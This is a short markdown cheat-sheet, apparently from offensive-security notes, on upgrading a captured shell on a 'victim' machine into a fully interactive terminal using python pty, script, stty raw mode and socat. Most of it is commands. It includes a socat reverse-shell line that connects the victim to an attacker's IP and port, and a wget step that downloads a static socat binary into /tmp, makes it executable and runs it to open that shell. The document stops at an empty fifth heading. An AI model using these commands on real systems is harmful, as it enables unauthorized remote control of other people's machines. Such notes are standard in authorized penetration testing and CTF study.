# Upgrade shell to fully interactive tty 


get a vistim shell connection on your machine  

you can use python to spawn tty shell by using the pty built-in library if python available  

or you can also use other techniques like script or ruby 

## methode 1 : python (half interactive shell) 

> **python -c 'import pty; pty.spawn("/bin/bash")'**

## methode 2 : script 

> **/usr/bin/script -qc /bin/bash /dev/null**  


## Methode 3 : stty options (fully interactive)

> **python -c 'import pty;pty.spawn("/bin/bash")'** 

> ****

check your local machine terminal and also terminal rows and columns   

> **echo $TERM** 
> **stty size**

we need to export that values to victim session
 
> **export TERM=xterm-256color**
> **export SHELL=/bin/bash** 

On the victim shell, fork the shell to background by pressing ctrl+z and 
now you'll bring back to your local terminal  
 
Follow with the command to bring back the victim shell to foreground   

> **stty raw -echo;fg**

now the curser should be somewhere on the middle and you need to type 

   >    **reset**

 now we can specify  terminal with the number of rows and columns to make it display properly as we get from our local machine  


stty rows <number of rows> columns <number of columns>  

Now we have a fully interactive shell  

## Methode 4 : socat (fully interactive)

check if f socat is installed on the victim machine   
if installed  you can launch a reverse shell with it  

on attacker machine : 

```
 socat file:`tty`,raw,echo=0 tcp-listen:<port>
```

on victim machine   :

> **socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<ip>:<port>**  

if socat is not installed  you can try your luck with the standalone binary  

you can find it here https://github.com/andrew-d/static-binaries/tree/master/binaries


> wget -q https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat -O /tmp/socat
> chmod +x /tmp/socat 
> /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<ip>:<port>

now you have a fully interactive shell on your machine   


## Methode 5 :  
